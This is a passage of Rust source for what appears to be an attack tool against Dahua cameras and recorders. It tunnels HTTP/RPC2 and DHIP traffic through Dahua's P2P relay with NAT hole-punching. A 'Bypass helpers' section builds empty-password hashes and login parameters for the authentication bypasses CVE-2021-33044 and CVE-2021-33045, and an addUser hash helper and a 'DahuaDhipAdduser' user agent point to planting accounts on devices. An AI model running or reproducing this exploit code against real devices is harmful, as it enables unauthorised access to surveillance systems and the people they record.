            device_public_ip: pub_ip(&device_pub),
        });
    }

    // Get sign from agent
    udp_send(
        &socket2,
        &agent_session
            .send(PTCPBody::Command(
                b"\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            ))
            .serialize(),
    )
    .await;
    let sign_data = udp_recv(&socket2, Duration::from_secs(5))
        .await
        .ok_or("Timeout waiting for sign from agent".to_string())?;
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] sign response raw ({} bytes): {:02x?}",
            sign_data.len(),
            &sign_data[..sign_data.len().min(64)]
        );
    }
    let mut pkt = agent_session.recv(PTCPPacket::parse(&sign_data));
    while matches!(pkt.body, PTCPBody::Empty) {
        udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
        let data = udp_recv(&socket2, Duration::from_secs(5))
            .await
            .ok_or("Timeout waiting for sign data".to_string())?;
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] sign data raw ({} bytes): {:02x?}",
                data.len(),
                &data[..data.len().min(64)]
            );
        }
        pkt = agent_session.recv(PTCPPacket::parse(&data));
    }
    let sign = match &pkt.body {
        PTCPBody::Command(c) if c.len() > 12 => c[12..].to_vec(),
        _ => return Err("Invalid sign response from agent".to_string()),
    };

    // NAT traversal
    let cookie: [u8; 4] = rand::random();
    let trans_id: [u8; 12] = rand::random();
    let cid_inv: Vec<u8> = cid.iter().map(|b| !b).collect();
    let device_addr_str = socket.peer_addr().unwrap().to_string();

    let mut msg1 = b"\xff\xfe\xff\xe7".to_vec();
    msg1.extend_from_slice(&cookie);
    msg1.extend_from_slice(&trans_id);
    msg1.extend_from_slice(b"\x7f\xd5\xff\xf7");
    msg1.extend_from_slice(&cid_inv);
    msg1.extend_from_slice(b"\xff\xfb\xff\xf7\xff\xfe");
    msg1.extend_from_slice(&ip_to_bytes(&device_addr_str));
    socket.send(&msg1).await.unwrap();

    let mut buf = [0u8; 4096];
    let result = timeout(Duration::from_secs(5), socket.recv(&mut buf)).await;
    if result.is_err() {
        return Err(
            "Timeout waiting for device hole-punch response. Try --relay mode.".to_string(),
        );
    }
    let n = result.unwrap().unwrap_or(0);
    if n < 20 {
        return Err("Malformed device hole-punch response. Try --relay mode.".to_string());
    }
    let rtrans_id = &buf[8..20];

    let local_addr_str = socket.local_addr().unwrap().to_string();
    let mut msg2 = b"\xfe\xfe\xff\xe7".to_vec();
    msg2.extend_from_slice(&cookie);
    msg2.extend_from_slice(rtrans_id);
    msg2.extend_from_slice(b"\x7f\xd6\xff\xf7");
    msg2.extend_from_slice(&cid_inv);
    msg2.extend_from_slice(b"\xff\xfb\xff\xf7\xff\xfe");
    msg2.extend_from_slice(&ip_to_bytes(&local_addr_str));
    socket.send(&msg2).await.unwrap();

    for _ in 0..5 {
        let _ = timeout(Duration::from_secs(2), socket.recv(&mut buf)).await;
    }

    // Establish PTCP with device
    let mut device_session = PTCPSession::new();
    udp_send(&socket, &device_session.send(PTCPBody::Sync).serialize()).await;

    {
        let pkt = recv_until(&socket, &mut device_session, Duration::from_secs(5), |b| {
            matches!(b, PTCPBody::Sync)
        })
        .await
        .ok_or("Timeout waiting for PTCP Sync from device".to_string())?;
        assert!(matches!(pkt.body, PTCPBody::Sync));
    }

    let mut auth_req = b"\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec();
    auth_req.extend_from_slice(&sign);
    udp_send(
        &socket,
        &device_session.send(PTCPBody::Command(auth_req)).serialize(),
    )
    .await;

    pkt = recv_until(
        &socket,
        &mut device_session,
        Duration::from_secs(5),
        |b| matches!(b, PTCPBody::Command(c) if !c.is_empty() && c[0] == 0x1A),
    )
    .await
    .ok_or("Timeout waiting for PTCP auth response from device".to_string())?;
    assert!(matches!(&pkt.body, PTCPBody::Command(c) if c[0] == 0x1A));

    udp_send(
        &socket,
        &device_session
            .send(PTCPBody::Command(
                b"\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            ))
            .serialize(),
    )
    .await;

    let _ = recv_until(&socket, &mut device_session, Duration::from_secs(3), |b| {
        matches!(b, PTCPBody::Empty)
    })
    .await;

    Ok(HandshakeResult {
        device_socket: Arc::new(socket),
        device_session: Arc::new(Mutex::new(device_session)),
        agent_socket: Arc::new(socket2),
        agent_session: Arc::new(Mutex::new(agent_session)),
        device_public_ip: pub_ip(&device_pub),
    })
}

/// Strip the port from an `IP:port` public address reported by the relay.
fn pub_ip(addr: &str) -> String {
    addr.split(':').next().unwrap_or(addr).to_string()
}

// ---- DHIP (JSON-RPC over binary framing, tunneled through PTCP) ----

pub struct DhipSession {
    pub realm_id: u32,
    pub session_id: u32,
    pub request_id: u32,
}

impl DhipSession {
    pub fn new(realm_id: u32) -> Self {
        Self {
            realm_id,
            session_id: 0,
            request_id: 0,
        }
    }

    pub fn next_request_id(&mut self) -> u32 {
        self.request_id += 1;
        self.request_id
    }

    pub fn build_packet(&mut self, json_str: &str) -> Vec<u8> {
        let msg_len = json_str.len() as u32;
        let total = msg_len;
        // Use JSON "id" if present, otherwise auto-increment
        let id = serde_json::from_str::<serde_json::Value>(json_str)
            .ok()
            .and_then(|v| v.get("id").and_then(|i| i.as_u64()))
            .map(|i| i as u32)
            .unwrap_or_else(|| self.next_request_id());

        let mut header = Vec::with_capacity(32);
        header.extend_from_slice(&0x00000020u32.to_le_bytes());
        header.extend_from_slice(&0x50494844u32.to_le_bytes());
        header.extend_from_slice(&self.session_id.to_le_bytes());
        header.extend_from_slice(&id.to_le_bytes());
        header.extend_from_slice(&total.to_le_bytes());
        header.extend_from_slice(&0u32.to_le_bytes());
        header.extend_from_slice(&msg_len.to_le_bytes());
        header.extend_from_slice(&0u32.to_le_bytes());
        header.extend_from_slice(json_str.as_bytes());
        header
    }
}

pub async fn dhip_recv(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    realm_id: u32,
    deadline: tokio::time::Instant,
) -> Option<String> {
    let mut buf: Vec<u8> = Vec::new();

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }

        let raw = udp_recv(sock, remaining).await?;
        if raw.len() < 25 {
            continue;
        }
        let pkt = PTCPPacket::parse(&raw);
        let body = PTCPBody::parse(&raw[24..]);

        let pkt_realm = match &body {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };

        {
            let mut s = session.lock().await;
            if pkt_realm == Some(realm_id) {
                let _ = s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                {
                    // ACK the data so the relay keeps streaming the response
                    let mut s = session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);

                if buf.len() >= 32 {
                    let head_flag = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]);
                    let magic = u32::from_le_bytes([buf[4], buf[5], buf[6], buf[7]]);

                    if head_flag == 0x20 && magic == 0x50494844 {
                        let msg_len =
                            u32::from_le_bytes([buf[24], buf[25], buf[26], buf[27]]) as usize;
                        if buf.len() >= 32 + msg_len {
                            let json_bytes = &buf[32..32 + msg_len];
                            if let Ok(s) = std::str::from_utf8(json_bytes) {
                                return Some(s.to_string());
                            }
                        }
                    } else {
                        eprintln!("  [debug] dhip_recv: payload realm={} unknown fmt: flag=0x{:08x} magic=0x{:08x} len={}", realm_id, head_flag, magic, buf.len());
                    }
                } else {
                    eprintln!(
                        "  [debug] dhip_recv: payload realm={} short ({} bytes)",
                        realm_id,
                        buf.len()
                    );
                }
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                break;
            }
            PTCPBody::Status(r, s) if *r != realm_id => {
                eprintln!(
                    "  [debug] dhip_recv: status realm={} not matching realm_id={}: '{}'",
                    r, realm_id, s
                );
                continue;
            }
            PTCPBody::Payload(p) if p.realm != realm_id => {
                eprintln!(
                    "  [debug] dhip_recv: payload realm={} != realm_id={} ({} bytes)",
                    p.realm,
                    realm_id,
                    p.data.len()
                );
                continue;
            }
            PTCPBody::Heartbeat => {
                {
                    let mut s = session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                }
                continue;
            }
            PTCPBody::Empty => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            _ => {
                let raw_type = if raw.len() > 24 { raw[24] } else { 0 };
                let realm_val = if raw.len() > 28 {
                    u32::from_be_bytes([raw[28], raw[29], raw[30], raw[31]])
                } else {
                    0
                };
                eprintln!(
                    "  [debug] dhip_recv: unhandled body type=0x{:02x} realm={} len={}",
                    raw_type,
                    realm_val,
                    raw.len()
                );
                continue;
            }
        }
    }

    None
}

pub async fn dhip_call(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    json_str: &str,
    probe_timeout: Duration,
) -> Option<String> {
    let realm_id;
    let session_id;
    {
        let s = dhip.lock().await;
        realm_id = s.realm_id;
        session_id = s.session_id;
    }

    {
        let mut s = dhip.lock().await;
        let pkt = s.build_packet(json_str);
        let mut ps = pcp_session.lock().await;
        eprintln!(
            "  [debug] dhip_call: sending realm={} sess={} req_id={} json={}",
            realm_id,
            s.session_id,
            s.request_id,
            &json_str[..json_str.len().min(120)]
        );
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: pkt,
            }))
            .serialize(),
        )
        .await;
    }

    let _ = session_id;
    let deadline = tokio::time::Instant::now() + probe_timeout;
    dhip_recv(sock, pcp_session, realm_id, deadline).await
}

// ---- Bypass helpers ----

pub fn empty_password_hash(user: &str, realm: &str, random: &str) -> String {
    let h1 = format!(
        "{:X}",
        md5::compute(format!("{}:{}:", user, realm).as_bytes())
    );
    format!(
        "{:x}",
        md5::compute(format!("{}:{}:{}", user, random, h1).as_bytes())
    )
}

pub fn password_hash(user: &str, realm: &str, random: &str, password: &str) -> String {
    let h1 = format!(
        "{:X}",
        md5::compute(format!("{}:{}:{}", user, realm, password).as_bytes())
    );
    format!(
        "{:x}",
        md5::compute(format!("{}:{}:{}", user, random, h1).as_bytes())
    )
}

#[derive(Clone, Copy)]
#[allow(dead_code)]
pub enum BypassMethod {
    NetKeyboard,
    Loopback,
}

impl BypassMethod {
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        match self {
            BypassMethod::NetKeyboard => "CVE-2021-33044 (NetKeyboard)",
            BypassMethod::Loopback => "CVE-2021-33045 (Loopback)",
        }
    }

    #[allow(dead_code)]
    pub fn login2_params(&self, user: &str, hash: &str) -> serde_json::Value {
        match self {
            BypassMethod::NetKeyboard => serde_json::json!({
                "userName": user,
                "password": hash,
                "clientType": "NetKeyboard",
                "ipAddr": "127.0.0.1",
                "loginType": "Direct",
                "authorityType": "Default",
            }),
            BypassMethod::Loopback => serde_json::json!({
                "userName": user,
                "password": hash,
                "clientType": "Local",
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "authorityType": "Default",
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Vectors produced by the reference Python implementation (dh-p2p helpers).
    #[test]
    fn devauth_crypto_matches_reference() {
        let user = "admin";
        let password = "12345";
        let randsalt = "a8fe9aedac8af59d8434062ba696333d";
        let nonce: u32 = 123456789;
        let curdate: u64 = 1700000000;
        let laddr = "127.0.0.1:5000";

        let key = p2p_auth_key(user, password, randsalt);
        assert_eq!(
            String::from_utf8_lossy(&key),
            "1261DBD279F5CD49C12335967A4DB61B"
        );

        let enc = encrypt_local_addr(&key, nonce, laddr);
        assert_eq!(enc, "PN0tQWlGB4+flbo0cIE=");

        let auth_xml = build_dev_auth_at(&key, user, nonce, randsalt, &enc, curdate);
        assert!(
            auth_xml.contains("<DevAuth>LUvOwPJA0VYVbqrbwC58rpvgKd/iYwV2zk4Dqr89JE8=</DevAuth>")
        );
        assert!(auth_xml.contains("<RandSalt>a8fe9aedac8af59d8434062ba696333d</RandSalt>"));
        assert!(auth_xml.contains("<UserName>admin</UserName>"));
    }

    #[test]
    fn device_info_decrypts_randsalt() {
        // Re-encrypt a known payload with the fixed info key/IV.
        let plain = br#"{"httpport":80,"privport":37777,"randsalt":"a8fe9aedac8af59d8434062ba696333d","rtspport":554,"tlsprivport":37778}"#;
        let enc = aes_ofb_apply(INFO_KEY, INFO_IV, plain);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&enc);
        let info = decrypt_device_info(&b64).expect("decrypt");
        assert_eq!(
            info.get("randsalt").and_then(|v| v.as_str()),
            Some("a8fe9aedac8af59d8434062ba696333d")
        );
    }

    #[test]
    fn extracts_randsalt_from_error_body() {
        let mut body = HashMap::new();
        body.insert(
            "body/RandSalt".to_string(),
            "a8fe9aedac8af59d8434062ba696333d".to_string(),
        );
        assert_eq!(
            randsalt_from_err_body(&body),
            Some("a8fe9aedac8af59d8434062ba696333d".to_string())
        );
        let mut body2 = HashMap::new();
        body2.insert("RandSalt".to_string(), "deadbeef".to_string());
        assert_eq!(randsalt_from_err_body(&body2), Some("deadbeef".to_string()));
        let mut body3 = HashMap::new();
        body3.insert("body/Result".to_string(), "DevPwd_InvalidSalt".to_string());
        assert_eq!(randsalt_from_err_body(&body3), None);
    }

    #[test]
    fn short_malformed_packets_do_not_panic() {
        // Field crash: an 8-byte 0x10 datagram panicked PTCPPayload::parse.
        let short_payload = [0x10, 0x00, 0x00, 0x00, 1, 2, 3, 4];
        match PTCPBody::parse(&short_payload) {
            PTCPBody::Payload(p) => assert!(p.data.is_empty()),
            other => panic!("expected Payload, got {:?}", other),
        }
        // Shorter than a PTCP header → Empty packet, no panic.
        for len in [0usize, 4, 8, 16, 23] {
            let raw = vec![0u8; len];
            let pkt = PTCPPacket::parse(&raw);
            assert!(matches!(pkt.body, PTCPBody::Empty));
        }
        // Truncated Bind/Status fall back to Command instead of panicking.
        let short_bind = [0x11u8, 0, 0, 0, 1, 2, 3];
        assert!(matches!(PTCPBody::parse(&short_bind), PTCPBody::Command(_)));
        let short_status = [0x12u8, 0, 0, 0, 1, 2];
        assert!(matches!(
            PTCPBody::parse(&short_status),
            PTCPBody::Command(_)
        ));
    }
}

// ---- Helpers ----

fn ip_to_bytes(addr: &str) -> Vec<u8> {
    let sock: SocketAddrV4 = addr.parse().expect("Invalid address");
    let ip = sock.ip().octets();
    let port = sock.port();
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&port.to_be_bytes());
    bytes.extend_from_slice(&ip);
    bytes.iter().map(|b| !b).collect()
}

#[async_trait]
trait DhP2P {
    async fn dh_request(&self, path: &str, body: Option<&str>, seq: &mut u32)
        -> Result<(), String>;
    async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse;
}

#[async_trait]
impl DhP2P for UdpSocket {
    async fn dh_request(
        &self,
        path: &str,
        body: Option<&str>,
        seq: &mut u32,
    ) -> Result<(), String> {
        let method = if body.is_some() { "DHPOST" } else { "DHGET" };
        let body_str = body.unwrap_or("");
        let nonce: u32 = rand::random();
        let currdate = Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
        let pwd = format!("{}{}DHP2P:{}:{}", nonce, currdate, USERNAME, USERKEY);
        let digest =
            base64::engine::general_purpose::STANDARD.encode(sha1::Sha1::digest(pwd.as_bytes()));
        *seq += 1;
        let req = format!(
            "{} {} HTTP/1.1\r\n\
             CSeq: {}\r\n\
             Authorization: WSSE profile=\"UsernameToken\"\r\n\
             X-WSSE: UsernameToken Username=\"{}\", PasswordDigest=\"{}\", Nonce=\"{}\", Created=\"{}\"\r\n\r\n{}",
            method, path, seq, USERNAME, digest, nonce, currdate, body_str
        );
        self.send(req.as_bytes())
            .await
            .map_err(|e| format!("DH send error ({} {}): {}", method, path, e))?;
        Ok(())
    }

    async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse {
        let mut buf = [0u8; 4096];
        match timeout(dur, self.recv(&mut buf)).await {
            Ok(Ok(n)) => {
                let res = String::from_utf8_lossy(&buf[..n]);
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] <<< raw: {}", res.replace("\r\n", "\\r\\n"));
                }
                DHResponse::parse_response(&res)
            }
            Ok(Err(e)) => DHResponse {
                code: 0,
                status: format!("recv error: {}", e),
                body: None,
            },
            Err(_) => DHResponse {
                code: 0,
                status: "timeout".to_string(),
                body: None,
            },
        }
    }
}

pub async fn wait_for_ptcp(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    timeout_dur: Duration,
    realm_id: u32,
) -> Option<PTCPBody> {
    let deadline = tokio::time::Instant::now() + timeout_dur;

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return None;
        }

        let data = udp_recv(sock, remaining).await?;
        if data.len() < 25 {
            continue;
        }
        let pkt = PTCPPacket::parse(&data);

        {
            let mut s = session.lock().await;
            s.recv(pkt);
        }

        let body = PTCPBody::parse(&data[24..]);

        match &body {
            PTCPBody::Status(r, _) if *r == realm_id => {
                return Some(body);
            }
            PTCPBody::Empty => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            _ => continue,
        }
    }
}

/// Bind to a remote port via PTCP and return realm_id.
pub async fn ptcp_bind(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    remote_port: u16,
    timeout_dur: Duration,
) -> Option<u32> {
    let realm_id: u32 = rand::random();
    {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Bind(realm_id, remote_port as u32))
                .serialize(),
        )
        .await;
    }

    let status = wait_for_ptcp(sock, session, timeout_dur, realm_id).await;
    if matches!(&status, Some(PTCPBody::Status(_, s)) if s == "CONN") {
        Some(realm_id)
    } else {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Status(realm_id, "DISC".into()))
                .serialize(),
        )
        .await;
        None
    }
}

pub async fn ptcp_disconnect(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm_id: u32) {
    {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Status(realm_id, "DISC".into()))
                .serialize(),
        )
        .await;
    }
    // Wait for the device's 0x12 ack and reply with an empty ack (matching the
    // reference). Legacy devices otherwise keep the bound port held and refuse
    // a later re-bind of the same port.
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        match udp_recv(sock, remaining).await {
            Some(data) if data.len() >= 24 => {
                let pkt = PTCPPacket::parse(&data);
                {
                    let mut s = session.lock().await;
                    s.recv(pkt);
                }
                if let PTCPBody::Status(r, _) = PTCPBody::parse(&data[24..]) {
                    if r == realm_id {
                        let mut s = session.lock().await;
                        udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                        break;
                    }
                }
            }
            _ => break,
        }
    }
}

// ---- HTTP/RPC2 Protocol ----

/// Send an HTTP request through PTCP tunnel and receive response.
/// `session` (when non-empty) is echoed back as the DhWebClientSessionID/WebClientSessionID
/// cookies, matching what Dahua's own apps send on /RPC2 calls.
pub async fn http_call(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    path: &str,
    body: &str,
    timeout: Duration,
    session: &str,
) -> Option<String> {
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] http_call -> {} ({}-byte body)", path, body.len());
    }
    LAST_CALL_DISC.store(false, Ordering::Relaxed);
    let cookie = if session.is_empty() {
        String::new()
    } else {
        format!(
            "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
            session, session
        )
    };

    let http_request = format!(
        "POST {path} HTTP/1.1\r\n\
         Accept-Encoding: identity\r\n\
         Content-Type: application/json\r\n\
         Connection: keep-alive\r\n\
         User-Agent: DahuaDhipAdduser\r\n\
         {}Host: {host}\r\n\
         Content-Length: {}\r\n\
         \r\n\
         {}",
        cookie,
        body.len(),
        body
    );

    {
        let mut ps = pcp_session.lock().await;
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: http_request.as_bytes().to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    let deadline = tokio::time::Instant::now() + timeout;
    let mut buf = Vec::new();
    let mut pkt_count = 0u32;
    let mut last_activity = tokio::time::Instant::now();
    let mut have_headers = false;
    let mut content_len: Option<usize> = None;
    let mut body_offset = 0usize;

    loop {
        let now = tokio::time::Instant::now();
        // Once headers are known, extend while payload packets keep arriving
        // (large responses stream slowly through the relay, e.g. ~36 packets
        // for a 46 KB user list). Idle calls still time out after `timeout`.
        let remaining = if have_headers {
            (last_activity + timeout).saturating_duration_since(now)
        } else {
            deadline.saturating_duration_since(now)
        };
        if remaining.is_zero() {
            break;
        }

        let raw = match udp_recv(sock, remaining).await {
            Some(raw) => raw,
            None => break,
        };
        if raw.len() < 25 {
            continue;
        }
        pkt_count += 1;
        let pkt = PTCPPacket::parse(&raw);
        let body_type = PTCPBody::parse(&raw[24..]);

        if HTTP_DEBUG.load(Ordering::Relaxed) {
            let preview: Vec<u8> = raw.iter().take(64).cloned().collect();
            eprintln!(
                "[debug] http_call <- packet #{}: {} bytes, body: {:?}, first: {:?}",
                pkt_count,
                raw.len(),
                body_type,
                String::from_utf8_lossy(&preview)
            );
        }

        let pkt_realm = match &body_type {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };

        {
            let mut s = pcp_session.lock().await;
            if pkt_realm == Some(realm_id) {
                s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body_type {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                last_activity = tokio::time::Instant::now();
                {
                    // ACK the data so the relay keeps streaming the response
                    let mut s = pcp_session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);
                let data_str = String::from_utf8_lossy(&buf);

                if let Some(pos) = data_str.find("\r\n\r\n") {
                    if !have_headers {
                        have_headers = true;
                        body_offset = pos + 4;
                        let headers = &data_str[..pos];
                        content_len = headers
                            .lines()
                            .find(|l| l.to_lowercase().starts_with("content-length:"))
                            .and_then(|l| l.split(':').nth(1))
                            .and_then(|s| s.trim().parse::<usize>().ok());
                    }

                    match content_len {
                        Some(len) if buf.len() >= body_offset + len => {
                            return Some(data_str.to_string());
                        }
                        None => {
                            return Some(data_str.to_string());
                        }
                        _ => {}
                    }
                }
            }
            PTCPBody::Heartbeat => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                continue;
            }
            PTCPBody::Empty => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] http_call: DISC received — device disconnected channel");
                }
                LAST_CALL_DISC.store(true, Ordering::Relaxed);
                break;
            }
            _ => continue,
        }
    }

    if buf.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&buf).to_string())
    }
}

/// Send an HTTP **GET** through the PTCP tunnel and return the raw response body
/// bytes (e.g. a JPG snapshot). Unlike `http_call` it keeps the data as bytes so
/// binary payloads are not corrupted by UTF-8 conversion. Basic auth is added via
/// the `Authorization` header, but the caller should also pass credentials as
/// query params for Dahua's snapshot CGI which often ignores the header.
/// Returns `(headers, body_bytes)` if a full response was read.
pub async fn http_get_binary(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    path: &str,
    timeout: Duration,
    user: &str,
    password: &str,
) -> Option<(String, Vec<u8>)> {
    LAST_CALL_DISC.store(false, Ordering::Relaxed);

    let auth = base64_encode_basic(&format!("{}:{}", user, password));
    let http_request = format!(
        "GET {path} HTTP/1.1\r\n\
         Accept-Encoding: identity\r\n\
         Connection: close\r\n\
         User-Agent: DahuaDhipAdduser\r\n\
         Authorization: Basic {auth}\r\n\
         Host: {host}\r\n\
         \r\n"
    );

    {
        let mut ps = pcp_session.lock().await;
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: http_request.as_bytes().to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    let deadline = tokio::time::Instant::now() + timeout;
    let mut buf: Vec<u8> = Vec::new();
    let mut last_activity = tokio::time::Instant::now();
    let mut have_headers = false;
    let mut content_len: Option<usize> = None;
    let mut body_offset = 0usize;

    loop {
        let now = tokio::time::Instant::now();
        let remaining = if have_headers {
            (last_activity + timeout).saturating_duration_since(now)
        } else {
            deadline.saturating_duration_since(now)
        };
        if remaining.is_zero() {
            break;
        }

        let raw = match udp_recv(sock, remaining).await {
            Some(raw) => raw,
            None => break,
        };
        if raw.len() < 25 {
            continue;
        }
        let pkt = PTCPPacket::parse(&raw);
        let body_type = PTCPBody::parse(&raw[24..]);

        let pkt_realm = match &body_type {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };

        {
            let mut s = pcp_session.lock().await;
            if pkt_realm == Some(realm_id) {
                s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body_type {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                last_activity = tokio::time::Instant::now();
                {
                    let mut s = pcp_session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);

                if !have_headers {
                    // locate header/body separator on raw bytes
                    if let Some(pos) = find_bytes(&buf, b"\r\n\r\n") {
                        have_headers = true;
                        body_offset = pos + 4;
                        let headers = String::from_utf8_lossy(&buf[..pos]).into_owned();
                        content_len = headers
                            .lines()
                            .find(|l| l.to_lowercase().starts_with("content-length:"))
                            .and_then(|l| l.split(':').nth(1))
                            .and_then(|s| s.trim().parse::<usize>().ok());
                        let headers_clone = headers.clone();
                        if content_len.is_none() {
                            return Some((headers_clone, buf[body_offset..].to_vec()));
                        }
                    } else {
                        continue;
                    }
                }

                if let Some(len) = content_len {
                    if buf.len() >= body_offset + len {
                        let headers = String::from_utf8_lossy(&buf[..body_offset - 4]).into_owned();
                        return Some((headers, buf[body_offset..].to_vec()));
                    }
                }
            }
            PTCPBody::Heartbeat => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                continue;
            }
            PTCPBody::Empty => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                LAST_CALL_DISC.store(true, Ordering::Relaxed);
                break;
            }
            _ => continue,
        }
    }

    if buf.is_empty() {
        None
    } else if have_headers {
        let headers_count = buf.len();
        let body = buf[body_offset.min(headers_count)..].to_vec();
        let headers = String::from_utf8_lossy(&buf[..body_offset.min(headers_count)]).into_owned();
        Some((headers, body))
    } else {
        let headers = String::from(&String::new());
        Some((headers, buf))
    }
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn base64_encode_basic(input: &str) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(input.as_bytes())
}

/// Extract JSON body from HTTP response (after \r\n\r\n).
pub fn http_extract_body(http_response: &str) -> Option<&str> {
    if let Some(pos) = http_response.find("\r\n\r\n") {
        Some(&http_response[pos + 4..])
    } else if let Some(pos) = http_response.find("\n\n") {
        Some(&http_response[pos + 2..])
    } else {
        None
    }
}

/// Compute password hash for addUser (HA1 format).
/// Format: MD5(username:realm:password) — uppercase hex to match Smart Manager.
/// The device stores this as-is and verifies DHIP login as MD5(user:random:stored).
pub fn http_adduser_password_hash(user: &str, realm: &str, password: &str) -> String {
    format!(
        "{:X}",
        md5::compute(format!("{}:{}:{}", user, realm, password).as_bytes())
    )
}
